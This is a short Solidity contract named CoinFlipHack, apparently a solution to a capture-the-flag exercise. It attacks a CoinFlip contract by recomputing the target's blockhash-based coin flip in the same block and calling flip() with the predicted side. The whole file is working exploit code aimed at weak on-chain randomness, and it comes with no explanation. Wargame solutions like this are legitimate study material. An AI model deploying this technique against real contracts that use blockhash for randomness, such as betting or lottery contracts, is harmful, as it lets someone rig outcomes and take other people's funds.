// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipHack {
  using SafeMath for uint256;
  CoinFlip public coinFlipContract;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlipAddress) {
    coinFlipContract = CoinFlip(_coinFlipAddress);
  }

  function makeGuess() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinFlipContract.flip(side);
  }
}